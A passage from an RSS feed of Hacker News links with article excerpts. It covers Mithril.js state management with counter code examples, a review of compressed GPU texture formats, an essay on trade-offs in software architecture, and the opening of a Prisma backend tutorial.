<pre><code><span>const</span> state <span>=</span> <span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>;</span><p><span>const</span> actions <span>=</span> <span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>;</span></p><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J4hcYgAIJGRpIC8k4JLoBXBokkAGSawDcAHTRHxUjNWIR6cBUqOTJENNQBOMHBskAKAJQKAfNLEsjD4agySANSKAIwU9pIAJjCu7iKavgFBIWG06lIAtLFG+kYm1lIAwnnCLrbACQBuEDAA7hl+8v4JDlheAOSJEI398WgOE5J9-YQxo5L91fkwLv0+Y5O9AwAO8zKMufnrPRPTAEaqxMT088r01FAQ1ADWmuaW1vhOqR5S7AuRNYbTbnS7XNC3ST3R4vN4WKxoOD4ZI-ES6CgLAprE4+EqGYxoLD4LA1YheRK0aiqX74M60RIATwxS1qPj0lBAcBgsHh1jwWkQWgKMQA7IgAMwAJjYHBAmBweDCcAENHojGYPDYAF0qI80M8EChOAqeFgIMRCC5oBzVC5yDwSMRtnBEAB6V3qbbPADmuSwrrNFqtUAAApL8Fp8OKA+bLdBiU58PwOcQGdtuJzXBBtqJWFrWEA">Live Example</a></p>
<p>As your application grows in size, it might be preferable that your state and actions are easily testable and replicable from the beginning. Further, instead of relying on lexical scoping for your actions to have access to your state, we can use a combination of dependency injection and closures so that an instance of your actions will always directly reference a specific state object. We can easily achieve this with factory functions that provide your initial state and actions that directly reference a single state object.</p>
<pre><code><span>const</span> <span>State</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>)</span><span>;</span><p><span>const</span> <span>Actions</span> <span>=</span> <span>state</span> <span>=&gt;</span> <span>(</span><span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
<p>From there, it is dead simple to reproduce your state and actions objects respectively:</p>
<pre><code><span>const</span> state   <span>=</span> <span>State</span><span>(</span><span>)</span><span>;</span><br><span>const</span> actions <span>=</span> <span>Actions</span><span>(</span>state<span>)</span><span>;</span></code></pre>
<p>Passing these to a Mithril component is trivial using the <code>attrs</code> property (near-equivalent to <code>props</code> in React) and object destructuring. Notice that our Counter component remains virtually unchanged:</p>
<pre><code><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span><span>{</span> attrs<span>:</span> <span>{</span> state<span>,</span> actions <span>}</span> <span>}</span></span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>m</span><span>(</span>Counter<span>,</span> <span>{</span> state<span>,</span> actions <span>}</span><span>)</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J4hcYgAIAysQyNJAXkkAKAJRKAfKuCS6AVwaJJABkms1AbgA6aW+KkBBasQj04SyRPkwtO25KSEGjUAE4wOEaqGora3oz4BgySANTKAIwUAZIAJjBhESLG6n7xMIm0hlIAtBm2FjZ2Ie5SZYGesj7qjQ6SGC5uaB7Kzq7uKmVWtvYtkgDClcKhnsDZAG4QMADuxbryxKFwxrplFH0D7ubmMZrZgVgqAOQ5EGuPWWjt7Q+PhOnvkkeCyqMFCjzUHy+9yeAAcAWUKlUIXdvk8AEb6YjEegA3T0ahQCDUADWxn6YyG+GCBUiUnYgJS4MhUJ+GKxOLOeJChJJZIulLyNJE5jOj2q4JRanqjVsWHwWEWxBUOVo1H0tPwaNoOQAnpz1psdtE-A9gUtOV45IwzuTBh4LPUrJQQHAYLB+QgeOkAMyIABMAFY2BwQJgcHhEnABDR6IxmDw2ABdKiEtDEz2oUNcPBYCDEQihaDO-Shcg8EjEGFHAD01cMMOJAHMKlhq7n84WoAABP34Ez4b1tvMF6Dy4L4fjO4g6mHcF1hCAw0SsROsIA">Live Example</a></p>
<p>(P.S. Credit goes to <a href="https://github.com/porsager">porsager</a> who shared this brilliant solution in the Mithril.js Gitter). <strong>This is my preferred approach to state management in Mithril.</strong> Passing your state and actions to child components would work as you'd expect. Simply pass your state and actions objects further down as <code>attrs</code>, or more wisely, be selective of what you choose to expose to child components.</p>
<p>Optional: you could also take an approach where your application is composed of solely stateless components. That is, every component is a pure, deterministic function. <a href="https://github.com/JorgeBucaran/hyperapp">Hyperapp</a> is a JavaScript framework that does not allow for local state in components. Instead, every component returns a portion of your UI that reflects the global state. While I highly recommend checking out Hyperapp (it's only 1kb gzipped!), this post is about Mithril, and you can use a similar approach with Mithril.</p>
<pre><code><span>const</span> <span>State</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>)</span><span>;</span><p><span>const</span> <span>Actions</span> <span>=</span> <span>state</span> <span>=&gt;</span> <span>(</span><span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>)</span><span>;</span></p><p><span>const</span> <span>Counter</span> <span>=</span> <span>(</span><span>state<span>,</span> actions</span><span>)</span> <span>=&gt;</span><br>  <span>m</span><span>(</span><span>'div'</span><span>,</span><br>    <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><span>,</span><br>    <span>Child</span><span>(</span>state<span>,</span> actions<span>)</span><br>  <span>)</span><br><span>;</span></p><p><span>const</span> <span>Child</span> <span>=</span> <span>(</span><span>state<span>,</span> actions</span><span>)</span> <span>=&gt;</span><br>  <span>m</span><span>(</span><span>'div'</span><span>,</span><br>    <span>m</span><span>(</span><span>'h2'</span><span>,</span> <span>'Child'</span><span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count <span>*</span> <span>2</span><span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>    <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><span>,</span><br>  <span>)</span><br><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <span>const</span> state   <span>=</span> <span>State</span><span>(</span><span>)</span><span>;</span><br>  <span>const</span> actions <span>=</span> <span>Actions</span><span>(</span>state<span>)</span><span>;</span></p><p>  <span>return</span> <span>{</span> <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>Counter</span><span>(</span>state<span>,</span> actions<span>)</span> <span>}</span><span>;</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J4hcYgAIAysQyNJAXkkAKAJRKAfKuCS6AVwaJJABkms1AbgA6aW+KkBBasQj04SyRPkwtO25KSEGjUAE4wOEaqGora3oz4BgySANTKAIwUAZIAJjBhESLG6n7xMIm0hlIAtBm2FjZ2Ie5SAMKVwqGeKmUUkhgubmhwMZrZWCoA5DkQAG6TWWiBgROThOkLkpPtVTChk2qLy5KrAA6bZRVVh9krUwBG+sTE9Ju69NRQENQA1sYDrnc+GCBUiUnYWxSByOy1Wj2erz67xCX1+-0GQLyoJE5j6k2q0NuklahGgOR6ckYfQBQxG2TUtka9haxNJUBy3V6-Qxw1G4ymM3mMLuawATJttmycoSlrCpuc+pcklIAFSSUU3WUi+EvNBvSQfVF-bmA4bAkLhMG4yEy45wp66-WG77GmmY-KWnEQ-G2yQMtBMtBYfBYDrEFQ5WjUfRg-D3Wg5ACefRKsUkwGyDi8lN8gWUsh86kagSzbuGnmcprgFJ8Vls2XCxH0oSWulmEBgAHdiqNiWG9jWqSbaRpWI0GpQQHAYLAeQgeCZECZqgBmdKIFdsDggTA4PCJOACGj0RjMHhsAC6VC+aB+89QO64eCwEGIhFC0EnzfIPBIxFOcCIAA9EBhinD8ADmFRYEBL5vh+UAAAKivgJj4CusGvu+0AhsE+D8JOxCJqc3BTmEECnKIrAXqwQA">Live Example</a></p>
<p>In the end, always do what feels right to you and makes more sense given your team and/or project. If this has been helpful or if you have any questions, <a href="mailto:me@kevinfiol.com">drop me an email!</a></p>
</article></div>]]>
            </description>
            <link>https://kevinfiol.com/blog/simple-state-management-in-mithriljs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243040</guid>
            <pubDate>Sat, 22 Aug 2020 09:59:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compressed GPU Texture Formats]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242838">thread link</a>) | @alex_hirner
<br/>
August 22, 2020 | https://themaister.net/blog/2020/08/12/compressed-gpu-texture-formats-a-review-and-compute-shader-decoders-part-1/ | <a href="https://web.archive.org/web/*/https://themaister.net/blog/2020/08/12/compressed-gpu-texture-formats-a-review-and-compute-shader-decoders-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-327">
	
	<!-- .entry-header -->

	<div>
		<p>Compressed texture formats is one of the esoteric aspects of graphics programming almost no one cares all that much about. Neither did I, however, I’ve recently taken an academic interest in the zoo of compressed texture formats.</p>
<p>During development in Granite, I occasionally find it useful to test scenes which target mobile on desktop and vice versa, and in Vulkan, where there are no fallback paths for unsupported compression formats, we gotta roll our own decompression.</p>
<p>While it really isn’t all that useful to write a decoder for these formats, my goal is to create a suite of reasonably understandable compute shader kernels which can decode all of the standard formats I care about. Of course, I could just use a Frankenstein decoder which merges together a lot of C reference decoders and call it a day, but that’s not aesthetically pleasing or interesting to me. By implementing these formats straight from the <a href="https://www.khronos.org/registry/DataFormat/">Khronos Data Format</a> specification, I learned a lot of things I would not otherwise know about these formats.</p>
<p>There are several major families of formats we can consider multi-vendor and standardized. Each of them fill their own niche. Unfortunately, desktop and mobile each have their own timelines with different texture compression standards, which is not fully resolved to this day in GPU hardware. (Basis Universal is something I will need to study eventually as well as it aims to solve this problem in software.)</p>
<p>By implementing all these formats, I got to see the evolution of block compression formats, see the major differences and design decisions that went into each format.</p>
<h3>The major format families</h3>
<p>First, it is useful to summarize all the families of texture compression I’ve looked at.</p>
<h4>S3TC / DXT</h4>
<p>The simplest family of formats. These formats are also known as the “BC” formats in Vulkan, or rather, BC 1, 2 and 3. This is the granddad of texture compression, similar to how I view MPEG1 in the video compression world.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs, probably for historical patent reasons.</p>
<h4>RGTC</h4>
<p>A very close relative of S3TC. These formats are very simple formats which specialize in encoding 1 and 2 uncorrelated channels, perfect for normal maps, metallic-roughness maps, etc. It is somewhat questionable to call these a separate family of formats (the Data Format specification separates them), since the basic format is basically exactly equal to the alpha format of S3TC, except that it extends the format to also support SNORM (-1, 1 range) alongside UNORM. These formats represent BC4 and BC5 in Vulkan.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs.</p>
<h4>ETC</h4>
<p>The ETC family of formats is very similarly laid out to S3TC in how different texture types are supported, but the implementation detail is quite different (and ETC2 is quite the interesting format). To support encoding full depth alpha and 1/2-component textures, there is the EAC format, which mirrors the RGTC formats.</p>
<p>These formats are firmly rooted in mobile GPUs. ETC1 was originally the only mandated format for OpenGLES 2.0 implementations, and ETC2 was mandated for OpenGLES 3.0 GPUs. It has almost no support on desktop GPUs. Intel iGPU is an exception here.</p>
<h4>BPTC</h4>
<p>This is where complexity starts to explode and where things get interesting. BC6 and BC7 are designed to compress high quality color images at 8bpp. BC6 adds support for HDR, which is to this day, one of only two ways to compress HDR images.</p>
<p>On desktop, BPTC is the state of the art in texture compression and was introduced around 2010.</p>
<h4>ASTC</h4>
<p>ASTC is the final boss of texture compression, and is the current state of the art in texture compression. Its complexity is staggering and aims to dominate the world with 128 bits. Mere mortals are not supposed to understand this format.</p>
<p>ASTC’s roots are on Mali GPUs, but it was always a Khronos standard, and is widely supported now on mobile Vulkan implementation (and Intel iGPU :3), at least the LDR profile. What you say, profiles in a texture compression format? Yes … yes, this is just the beginning of the madness that is ASTC.</p>
<h4>PVRTC?</h4>
<p>PVRTC is a PowerVR-exclusive format that has had some staying power due to iOS and I will likely ignore it in this series. However, it seems like a <strong>very different kind of format</strong> to all the others and studying it might be interesting. However, there is zero reason to use this format in Granite, and I don’t want to chew over too much.</p>
<h2>What is a texture compression format anyway?</h2>
<p>In a texture compression format, the specification describes a process for taking random bits given to it, and how to decode the bit-soup into texels. There are fundamental constraints in texture compression which is unique to this problem domain, and these restrictions heavily influence the design of the formats in question.</p>
<h4>Fixed block size</h4>
<p>To be able to randomly access any texel in a texture, there must be an O(1) mapping from texture coordinate to memory address. The only reasonable way to do this is to have a fixed block size. In all formats, 4×4 is the most common one. (As you can guess, ASTC can do odd-ball block sizes like 6×5).</p>
<p>Similarly, for reasons of random access, the number of bits spent per block must be constant. The typical block sizes are 64-bits and 128-bits, which is 4bpp and 8bpp respectively at 4×4 block size.</p>
<p>Image and video compression has none of these restrictions. That is a major reason why image and video compression is so much more efficient.</p>
<h4>A set of coding tools</h4>
<p>Each format has certain things it can do. The more complex the operations the format can do, the more expensive the decoding hardware becomes (and complex a software decoder becomes), so there’s always a challenge to balance complexity with quality per bit when standardizing a format. The most typical way to add coding tools is to be able to select between different modes of operation based on the content of the block, where each mode is suited to certain patterns of input. Use the right tool for the job! As we will see in this study, the number of coding tools will increase exponentially, and it starts to become impossible to make good use of all the tools given to you by the format.</p>
<p>Encoding becomes an optimization task where we aim to figure out the best coding tools to use among the ones given to us. In simpler formats, there are very few things to try, and approaching the optimal solution becomes straight forward, but as we get into the more esoteric formats, the real challenge is to prune dead ends early, since brute forcing our way through a near-infinite configuration space is not practical (but maybe it is with GPU encode? :3)</p>
<h2>Commonalities across formats</h2>
<p>Image compression and video compression uses the Discrete Cosine Transform (DCT) even to this day. This fundamental compression technique has been with us since the 80s and refuses to die. All the new compression formats just keep piling on complexity on top of more complexity, but in the center of it all, we find the DCT, or some equivalent of it.</p>
<p>Very similarly, texture compression achieves its compression through interpolation between two color values. Somehow, the formats all let us specify two <strong>endpoints</strong> which are constant over the 4×4 block and interpolation <strong>weights</strong>, which vary per pixel. Most of the innovation in the formats all comes down to how complicated and esoteric we can make the process of generating the endpoints and weights.</p>
<p>The weight values are typically expressed with very few bits of precision per texel (usually 2 or 3), and this is the main way we will keep bits spent per pixel down. This snippet is the core coding tool in all the formats I have studied:</p>
<pre>decoded_texel = mix(endpoint0, endpoint1, weight_between_0_and_1);</pre>
<h4>To correlate, or not to correlate?</h4>
<p>The endpoint model blends all components in lock-step. Typically the endpoint will be an RGB value. We call this correlated, because this interpolation will only work well if chrominance remains fairly constant with luminance being the only component which varies significantly. In uncorrelated input, say, RGB with an alpha mask, many formats let us express decorrelated inputs with two sets of weights.</p>
<pre>decoded_rgb = mix(endpoint0_rgb, endpoint1_rgb, rgb_weight);
decoded_alpha = mix(endpoint0_alpha, endpoint1_alpha, alpha_weight);</pre>
<p>This costs a lot more bits to encode since alpha_weight is very different from rgb_weight, but it should be worth it.</p>
<p>Many formats let us express if there is correlation or not. Correlation should always be exploited.</p>
<h4>Working around the horrible endpoint interpolation artifacts</h4>
<p>Almost all formats beyond the most trivial ones try really hard to come up with ways to work around the fact that endpoint interpolation leads to horrible results in all but the simplest input. The most common approach here is to split the block into partitions, where each partition has its own endpoints.</p>
<h2>S3TC – The basics</h2>
<p>A compute shader decoder:</p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp</a></p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h</a></p>
<h3>BC1 – 4×4 – 64 bits</h3>
<p>The BC1 format is extremely simple and a good starting point. 32 bits is used to encode two RGB endpoints in RGB565 format. The other 32 bits encode 16 weights, with 2 bits allocated to each texel.</p>
<p>This lets us represent interpolation weights of 0, 1/3, 2/3 and 1.</p>
<p>Since there is a symmetry in this design, i.e.:</p>
<pre>mix(a, b, l) == mix(b, a, 1.0 - l)</pre>
<p>there would be two ways to specify the same block, where we swap endpoints and invert the weights to compensate. This is an extra bit of information we can exploit. Based on the integer representation of the two endpoints, we can check if one of greater than the other, and use a different decoding mode based on that information. This exploitation of symmetry will pop up again in many formats later! In the secondary mode, we add support for 1-bit …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://themaister.net/blog/2020/08/12/compressed-gpu-texture-formats-a-review-and-compute-shader-decoders-part-1/">https://themaister.net/blog/2020/08/12/compressed-gpu-texture-formats-a-review-and-compute-shader-decoders-part-1/</a></em></p>]]>
            </description>
            <link>https://themaister.net/blog/2020/08/12/compressed-gpu-texture-formats-a-review-and-compute-shader-decoders-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242838</guid>
            <pubDate>Sat, 22 Aug 2020 09:07:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Laws of Architectural Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242562">thread link</a>) | @ggeorgovassilis
<br/>
August 22, 2020 | https://www.ufried.com/blog/laws_of_architectural_work/ | <a href="https://web.archive.org/web/*/https://www.ufried.com/blog/laws_of_architectural_work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
    
<p>After completing the short <a href="https://ufried.com/blog/oss_1_rise_of_oss/">“OSS” blog series</a> series and before returning to the <a href="https://ufried.com/blog/simplify_1/">“Simplify!” blog series</a> that grew quite a lot while writing, I would like to discuss a completely different topic. I call it “the two first laws of architectural work”.</p>
<p>Of course, what I will describe are not actual laws. “Findings” or “lessons” (without the educational undertone) would be more accurate.</p>
<p>And even if they were laws, I do not know if they would be the first two ones. I just called them the first two ones to emphasize their relative importance. At least I find them very relevant as I see so many places where they are – often willfully – ignored which usually leads to negative consequences.</p>
<p>So, “Two IMO relevant findings regarding architectural work” would probably be a more accurate title. But that would not sound so impressive … ;)</p>
<p>Also, it would not express how important I think the two observations are. Therefore I will stick with the “two first laws”.</p>
<h2 id="the-first-law-of-architectural-work">The first law of architectural work</h2>
<p>The first law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>Every decision has its price. No decision is for free.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>No decision only has upsides. Every decision also has downsides.</p>
</blockquote>
<p>I think that it is essential to understand that there is no free lunch in architectural work. Whenever you decide for an architectural option, you will get a mix of advantages and disadvantages. While in coding you sometimes have situations where one option is <em>right</em> and the others are <em>wrong</em>, you will never have such a situation in architectural work.</p>
<p>In architectural work, there is no “right” or “wrong”. There is only “better” or “worse”. I often tend to say, while in development things like “black” or “white”, 0 or 1 exist, in architecture only many shades of gray, the numbers between 0 and 1 exist. With every architectural decision you will get something, but you will also pay a price for it.</p>
<p>I am not sure if this pattern is as old as our industry, but especially in the recent years I noticed a growing tendency only to mention the potential advantages of a solution and hide the disadvantages.</p>
<p>I’ve seen too many talks talks, articles, posts, and alike, that just praise some concept, technology or method, “Do &lt;X&gt; and everything will be fine!” being the typical message. Downsides? Trade-offs? Nil return!</p>
<p>We could ignore those types of messages if they would not lead to really bad solutions in actual projects if project teams blindly pick up those messages. Two little examples:</p>
<p><strong>Microservices</strong></p>
<p>In the recent years, most IT projects went for microservices, often based on dubious rationales. But are microservices really “right” while the vilified monoliths are “wrong”?</p>
<p>If you take a neutral stance, you see that microservices can help you, e.g., with decoupling capability teams better, to implement some type of NFRs better and to upgrade technology easier. On the other hand they multiply operations complexity by orders of magnitude. And if you do not get your functional design right, availability and response times of the resulting application will badly suffer.</p>
<p>(Deployment) monoliths on the other side are the simplest type of application structure in operations. One executable, that’s it. Either it is up or down. Easy to monitor. Well-known and proven scaling patterns (replication and load balancers) if implemented correctly. On the other hand monoliths tend to become a big ball of mud, which is hard to maintain and leads to tight team coupling. Also technology upgrades become harder with the size of the application.</p>
<p>There would be a lot of details to add, but the message already becomes clear: It is not that one is “right” and the other is “wrong” (as many people try to suggest). Both have their strengths and weaknesses. Deciding for any one of the two gives you some advantages while it also gives you some disadvantages at the same time. And hiding the disadvantages does not make them go away.</p>
<p><strong>Event-based communication</strong></p>
<p>Event-based communication is another fashionable concept of the recent years and its advocates tend to talk down request-response-based communication.</p>
<p>Again, taking a neutral stance, you see that event-based communication, e.g., helps to decouple parts better on a technical level, the reversed dependency relation (receiver knows sender) can be advantageous, event brokers can even create location transparency, timeouts can be handled differently and more.</p>
<p>On the other hand event-based communication quickly creates complex communication patterns that are hard to understand, that can easily result in deadlocks and other unexpected behaviors, that can create a tight functional coupling between the parts if not designed very carefully, creates new challenges like dealing with lost or duplicate messages.</p>
<p>Request-response-based communication on the other side is easy to grasp as it resembles the call-stack pattern of communication flow that we are used to. It is very easy to implement and the system behavior tends to be a lot more deterministic and predictable as with event-based communication. On the other hand, blocking requests and latency – or timeouts if you monitor the call durations – either lead to undesired system behavior at runtime or quite some added complexity.</p>
<p>Again, while the discussion is not complete, the same message takes shape: It is not that one is “right” and the other is “wrong”. Both have their strengths and weaknesses.</p>
<p>I could a lot more examples, but these two little examples should be sufficient to illustrate what I mean with “Every decision has its price”.</p>
<p>If you are experienced in architectural work, this “law” should be obvious for you. Yet, I see a lot of people either willingly or unconsciously ignoring it. This becomes especially dangerous if “Agile” developer teams decide to make architectural work without anyone on the team having the required education and experience. Based on my observations, these teams tend to be very vulnerable to “Do &lt;X&gt; and everything will be fine!” messages. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>To wrap the first law up: The key to good architectural work is to find architectural decisions – or options if you prefer that term – that has more upsides than downsides.</p>
<p>This leaves the question, how to determine the up- and downsides of an option, which immediately leads to the second law.</p>
<h2 id="the-second-law-of-architectural-work">The second law of architectural work</h2>
<p>The second law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>A decision can only be evaluated with respect to its context.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>Decisions are not invariably â€œgoodâ€� or â€œbadâ€�, but only with respect to a given context.</p>
</blockquote>
<p>This “law” is almost as important as the first one. I see too many decisions where advantages or disadvantages of concepts, technologies or methods are discussed without taking the actual context into account.</p>
<p>While there is nothing wrong to point out general trade-offs of an architectural option, it must be clear that they are never final but can only support the actual decision making process.</p>
<p>To illustrate that point, let us briefly revisit the microservices example from above. I sketched some advantages and disadvantages of microservices and monoliths. Which one to take (making the simplifying assumption here that those were the only options available)?</p>
<p>Well, it depends!</p>
<p>What is your context? You are a hyperscaler or live in a market where you need to move very fast with independent capability teams and we discuss customer-facing applications? Probably microservices will be the better option for you as the competitive advantages in terms of market responsiveness they give you will outweigh their disadvantages while for monoliths the opposite is true in the given context.</p>
<p>You are, e.g., an insurance company living in the highly regulated German market and we discuss an accounting solution? While microservices will give you basically no competitive advantages in such a setting, they offer grave disadvantages compared to a monolithic solution. So, very likely the monolith will be the better option.</p>
<p>You are a standard software manufacturer who sells solutions to clients who need to run the solutions (i.e., no SaaS solutions) and the operations teams of the client often do not have deep IT knowledge (a setting that you find quite often in SME-type companies). While on the development side microservices could give you a competitive advantage, your clients most likely would be hopelessly overstrained running a microservices solution.</p>
<p>As in the end the competitive advantage at deployment is not worth anything if your clients are not able to use your solutions, you will need to focus on providing the simplest possible solution from an operations point of view – which is a (deployment) monolith.</p>
<p>Additionally, a strict modularization concept at development time resulting in independent modules that are assembled together at build time could help you to realize parts of the competitive advantage that microservices would offer.</p>
<p>Again, while not complete these little examples should help to understand that one-size-fits-all solutions do not exist and the best option can vary heavily depending on the given context.</p>
<p>Architectural decisions are never â€œgoodâ€� or â€œbadâ€� per se, but only relative to a given context. Still, I see too many architectural discussions and recommendations being made in a vacuum, without taking the context into account.</p>
<h2 id="summing-up">Summing up</h2>
<p>These were my two “laws” of architectural work. Personally, I think it is essential to bear them in mind to be able to make good architectural work. Still, I see the opposite happening too often – at conferences, in articles, and also in actual project work, usually leading to bad decisions.</p>
<p>There would be a lot more to discuss in the context of the two laws, but I will leave it here. I hope I was able to bring the point across and would be glad if it contained some valuable ideas for you.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>To be clear: This is not an advocacy for architects. To be honest, I am quite suspicious about most people who …</p></li></ol></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ufried.com/blog/laws_of_architectural_work/">https://www.ufried.com/blog/laws_of_architectural_work/</a></em></p>]]>
            </description>
            <link>https://www.ufried.com/blog/laws_of_architectural_work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242562</guid>
            <pubDate>Sat, 22 Aug 2020 08:09:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Modern Back End with TypeScript, PostgreSQL and Prisma: REST API]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24242536">thread link</a>) | @piotrzientara
<br/>
August 22, 2020 | https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/ | <a href="https://web.archive.org/web/*/https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><div><hr><h3 id="introduction"><a href="#introduction" aria-label="introduction permalink"></a>Introduction</h3><p>The goal of the series is to explore and demonstrate different patterns, problems, and architectures for a modern backend by solving a concrete problem: <strong>a grading system for online courses.</strong> This is a good example because it features diverse relations types and is complex enough to represent a real-world use case.</p><p>The recording of the live stream is available above and covers the same ground as this article.</p><h4 id="what-the-series-will-cover"><a href="#what-the-series-will-cover" aria-label="what the series will cover permalink"></a>What the series will cover</h4><p>The series will focus on the role of the database in every aspect of backend development covering:</p><table><thead><tr><th>Topic</th><th>Part</th></tr></thead><tbody><tr><td>Data modeling</td><td><a href="https://www.prisma.io/blog/modern-backend-1-tsjs1ps7kip1/">Part 1</a></td></tr><tr><td>CRUD</td><td><a href="https://www.prisma.io/blog/modern-backend-1-tsjs1ps7kip1/">Part 1</a></td></tr><tr><td>Aggregations</td><td><a href="https://www.prisma.io/blog/modern-backend-1-tsjs1ps7kip1/">Part 1</a></td></tr><tr><td>REST API layer</td><td>Part 2 (current)</td></tr><tr><td>Validation</td><td>Part 2 